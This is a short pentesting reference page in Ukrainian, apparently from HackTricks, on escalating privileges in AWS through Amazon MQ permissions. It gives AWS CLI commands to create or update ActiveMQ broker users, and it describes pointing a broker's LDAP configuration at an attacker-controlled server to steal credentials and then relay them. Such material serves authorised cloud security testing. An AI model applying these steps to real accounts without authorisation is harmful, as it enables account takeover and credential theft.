# AWS - MQ Privesc

{{#include ../../../banners/hacktricks-training.md}}

## MQ

Для отримання додаткової інформації про MQ дивіться:

{{#ref}}
../aws-services/aws-mq-enum.md
{{#endref}}

### `mq:ListBrokers`, `mq:CreateUser`

З цими дозволами ви можете **створити нового користувача в брокері ActimeMQ** (це не працює в RabbitMQ):
```bash
aws mq list-brokers
aws mq create-user --broker-id <value> --console-access --password <value> --username <value>
```
**Потенційний вплив:** Доступ до чутливої інформації через ActiveMQ

### `mq:ListBrokers`, `mq:ListUsers`, `mq:UpdateUser`

З цими дозволами ви можете **створити нового користувача в брокері ActimeMQ** (це не працює в RabbitMQ):
```bash
aws mq list-brokers
aws mq list-users --broker-id <value>
aws mq update-user --broker-id <value> --console-access --password <value> --username <value>
```
**Потенційний вплив:** Доступ до чутливої інформації через ActiveMQ

### `mq:ListBrokers`, `mq:UpdateBroker`

Якщо брокер використовує **LDAP** для авторизації з **ActiveMQ**, можливо **змінити** **конфігурацію** сервера LDAP, що використовується, на **той, що контролюється атакуючим**. Таким чином, атакуючий зможе **викрасти всі облікові дані, що надсилаються через LDAP**.
```bash
aws mq list-brokers
aws mq update-broker --broker-id <value> --ldap-server-metadata=...
```
Якщо ви зможете якимось чином знайти оригінальні облікові дані, використані ActiveMQ, ви зможете виконати MitM, вкрасти облікові дані, використати їх на оригінальному сервері та надіслати відповідь (можливо, просто повторно використавши вкрадені облікові дані, ви зможете це зробити).

**Потенційний вплив:** Вкрасти облікові дані ActiveMQ

{{#include ../../../banners/hacktricks-training.md}}
